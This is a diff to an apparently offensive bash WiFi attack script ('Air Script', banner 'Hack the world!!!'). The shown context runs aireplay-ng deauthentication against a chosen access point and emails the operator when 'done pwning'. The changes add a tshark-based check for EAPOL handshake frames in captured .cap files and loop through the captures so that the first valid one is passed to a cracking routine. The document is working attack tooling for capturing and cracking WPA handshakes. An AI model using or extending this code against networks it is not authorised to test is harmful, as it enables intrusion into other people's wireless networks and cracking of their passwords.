@@ -78,7 +78,7 @@ echo -e "${Red}
          ░                                  "
 echo -e "${Yellow} \n             Hack the world!!!     "
 echo -e "${Green}\n                    Developed by: Liam Bendix"
-echo -e "${Green}                         Version: 2.0.2 Stable"
+echo -e "${Green}                         Version: 2.0.3 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -252,7 +252,9 @@ stopMon
 echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 checkServices 
 sleep 10
+checkServices 
 check_cap_files
+check_eapol_in_cap
 sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
 crack
 }
@@ -268,6 +270,7 @@ sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
 stopMon
 checkServices 
 check_cap_files
+check_eapol_in_cap
 crack
 
 }
@@ -297,7 +300,6 @@ notification1
 }
 
 
-
 attackAllYes () {
 echo "Enter your email address for notifications: " email
 read email
@@ -309,6 +311,7 @@ stopMon
 checkservices
 sleep 10
 check_cap_files
+check_eapol_in_cap
 sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
 crack
 }
@@ -322,12 +325,9 @@ sudo chmod -R 755 air-crack
 echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
 checkservices
 check_cap_files
+check_eapol_in_cap
 crack
 }
-
-
-
-
 
 
 
@@ -503,18 +503,47 @@ cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
 }
 
 
+
+# Function to check if EAPOL frames exist in a .cap file
+check_eapol_in_cap() {
+    local cap_file=$1
+    if tshark -r "$cap_file" -Y "eapol" | grep -q "EAPOL"; then
+        echo "EAPOL data found in $cap_file"
+        return 0
+    else
+        echo "No EAPOL data found in $cap_file"
+        return 1
+    fi
+}
+
+# Function to check if .cap files exist and verify EAPOL frames
 check_cap_files() {
     # Clear the screen
-    clear
+    #clear
 
     # Check if any .cap files exist in the current directory
     if ls *.cap &> /dev/null; then
         # .cap files are present
-        echo -e "\e[32m[SUCCESS]\e[0m"  # Green text
-        crack
+        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
+        
+        # Loop through each .cap file to check for EAPOL frames
+        for cap_file in *.cap; do
+            echo -e "\nChecking $cap_file for EAPOL frames..."
+            if check_eapol_in_cap "$cap_file"; then
+                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
+                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
+                return 0  # Stop after finding a valid file with EAPOL
+            else
+                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
+            fi
+        done
+        
+        # If no valid .cap files with EAPOL are found, exit
+        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured, please try again! Exiting...\e[0m"
+        exit 1
     else
         # No .cap files found
-        echo -e "\e[31m[FAILED]\e[0m"  # Red text
+        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
         sleep 3
         exit 1
     fi
